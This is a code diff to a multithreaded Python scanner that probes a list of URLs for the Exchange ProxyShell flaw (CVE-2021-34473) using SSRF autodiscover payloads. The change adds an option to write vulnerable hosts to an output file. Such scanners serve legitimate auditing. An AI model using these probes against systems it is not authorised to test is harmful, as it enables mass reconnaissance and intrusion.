@@ -13,7 +13,7 @@ headers = {
 }
 
 
-def proxyshell_check(url):
+def proxyshell_check(url, output):
     url = url.strip()
     payload = "/autodiscover/autodiscover.json?@test.com/owa/?&Email=autodiscover/autodiscover.json%3F@test.com"
     payload2 = "/autodiscover/autodiscover.json?@test.com/ews/exchange.asmx?&Email=autodiscover/autodiscover.json%3F@test.com"
@@ -30,6 +30,8 @@ def proxyshell_check(url):
             
                     except Exception as e:
                         pass
+                    with open(output, "a") as file:
+                        file.write("[+] CVE-2021-34473 Vulnerable, {url} FQDN: {fqdn}\n".format(url=url, fqdn=fqdn))
                     
                     print("[+] CVE-2021-34473 Vulnerable", url, "FQDN:",fqdn)
 
@@ -37,14 +39,14 @@ def proxyshell_check(url):
         pass
 
 
-def thread(thread, file):
+def thread(thread, file, output):
     with ThreadPoolExecutor(thread) as executor:
         with open(file, "r") as file:
             futures = []
 
 
             for url in file:
-                futures.append(executor.submit(proxyshell_check, url))
+                futures.append(executor.submit(proxyshell_check, url, output))
             
             if len(futures) >= thread:
                 try:
@@ -62,9 +64,10 @@ if __name__ == '__main__':
     parser = argparse.ArgumentParser(description='')
     parser.add_argument("--thread", dest="thread", default=10, type=int)
     parser.add_argument("--file", dest="file", required=True)
+    parser.add_argument("--output", dest="output", required=True)
     args = parser.parse_args()
 
     try:
-        thread(args.thread, args.file)
+        thread(args.thread, args.file, args.output)
     except KeyboardInterrupt:
         print("Exit...")
